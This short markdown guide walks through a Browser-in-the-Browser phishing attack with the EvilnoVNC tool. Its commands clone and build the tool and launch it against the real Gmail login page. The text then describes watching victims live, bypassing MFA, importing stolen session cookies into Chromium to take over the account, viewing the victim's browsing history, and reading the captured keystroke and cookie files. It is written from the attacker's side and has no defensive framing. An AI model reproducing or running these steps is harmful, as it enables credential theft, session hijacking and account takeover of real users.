# Browser-in-the-Browser BitB attack

Tool: EvilnoVNC: https://github.com/JoelGMSec/EvilnoVNC

## Steps

#### 1) Clone the EvilnoVNC tool 

    git clone https://github.com/JoelGMSec/EvilnoVNC

#### 2) Setup tool

    cd EvilnoVNC

To ensure Docker has the proper access to build context files. The ownership of the Downloads directory is first changed to match the container’s internal user.

    sudo chown -R 103 Downloads

#### 3) Deploy the EvilnoVNC phishing environment as a container

    sudo docker build -t joelgmsec/evilnovnc .

#### 4) Launch EvilnoVNC with Targeted Phishing Page

    sudo chmod +x *

    sudo ./start.sh 1920x1080x24 https://mail.google.com

This step makes all scripts executable. It then launches a virtual desktop inside a Docker container at the specified resolution and opens the real Gmail login page in a browser, exposing it interactively via noVNC over WebSockets.

#### 5) Wait for the victim to fall for our attack! (Our attack even Bypasses MFA)

#### 6) You can check the victim's actions in real-time view by browsing on our localhost.

#### 7) Next, session cookies are extracted from our own browser and imports them into Chromium for full access without needing to phish artifacts, code injections, or traffic proxying.

#### 8) In Chromium, visit

    chrome://history

which shows the victim's browsing history.

#### 9) Retrieve cookies and keystrokes

Location:

    cat /novnc/Downloads/Keylogger.txt
    cat /novnc/Downloads/Cookies.txt

